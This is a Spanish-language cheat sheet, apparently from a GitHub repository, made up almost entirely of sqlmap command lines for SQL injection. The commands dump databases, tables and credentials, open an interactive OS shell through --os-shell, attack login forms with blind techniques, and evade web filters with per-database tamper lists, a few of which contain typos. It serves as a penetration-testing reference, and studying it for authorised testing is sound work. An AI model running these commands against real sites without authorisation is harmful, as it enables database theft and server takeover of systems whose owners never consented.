# SQLMap Cheat Sheet

#### Uso simple
```
sqlmap -u "<URL>"
```

#### Conocer el usuario actual
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-user
```

#### Conocer la Base de Datos actual
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-db
```

#### Especificar el Sistema Gestor de Base de Datos
```
sqlmap -u "<URL>" --dbms=<Name-DBMS>
```

#### Listar los usuarios de la BD del sitio
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --users
```

#### Listar las Bases de Datos del sitio
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --dbs
```

#### Listar las tablas de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> --tables
```

#### Listar las columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --columns
```

#### Ver contenido de ciertas Columnas de una Tabla
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> -C <Column1,Column2> --dump
```

#### Ver todo el contenido de una Tabla de una Base de Datos
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump
```

#### Obtener un Shell de OS interactivo
```
sqlmap -u "<URL>" --cookie="<Cookie-Value>" --os-shell
```

#### Listar BD, usando un parámetro de 'User-Agent' con el método GET
```
sqlmap -u '<URL>' -p User-Agent --method=GET --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --dbs
```

#### Colocar un parámetro y usar la técnica de UNION
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U
sqlmap -u "http://site.com/index.php?search=n" -p search --technique=U
```

#### Colocar un parámetro, usar la técnica de UNION, usando un verbose nivel 3 e ignorando los resultados almacenados del query
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U --banner -v3 --fresh-queries
```

#### Colocar un parámetro, usar la técnica de UNION y enumerar los usuarios de la BD
```
sqlmap -u "<URL>" -p <PARAMETER> --technique=U --users
```

#### Usar en formulario de Login, para enviar datos en POST y usando la técnica BLIND
```
sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --banner
```

#### Usar en formulario de Login, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
```
sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --dbs
```

#### Enviar las peticiones a nuestro propio proxy
```
sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --proxy=http://localhost:8080 --dbs
```

#### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
```
sqlmap -r "<PATH_FILE>" --data='user=a&pass=a' -p user --technique=B --dbs

sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --cookie="name:value" --no-cast --dbs

sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=2 --level=3 --tamper=space2comment,randomcase,between --no-cast --dbs

sqlmap -u "<URL>" -p <PARAMETER> --cookie="name:value" --threads=2 --no-cast -A "NONE" --proxy=http://localhost:8080 --tamper=space2comment,randomcase,between,charencode --not-string='A database error has been detected and fowarded to system admin.' --level=3 --risk=2 --dbms=mysql -v 3 --dbs
```

## Tampers

#### MSSQL
```
--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

#### MySQL
```
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

#### PostgreSQL
```
--tamper=xforwardedfor,space2comment,space2plus,space2randomblank,between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere
```

#### SQLite
```
--tamper=space2plus,unionalltounion.unmagicquotes,xforwardedfor,ifnull2ifisnull,randomcase,securesphere,space2comment,space2dashmmultiplespaces,nonrecursivereplacement 
```

## Techniques

- ``` B ```: Boolean-based blind
- ``` E ```: Error-based
- ``` U ```: Union query-based
- ``` S ```: Stacked queries
- ``` T ```: Time-based blind
- ``` Q ```: Inline queries

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)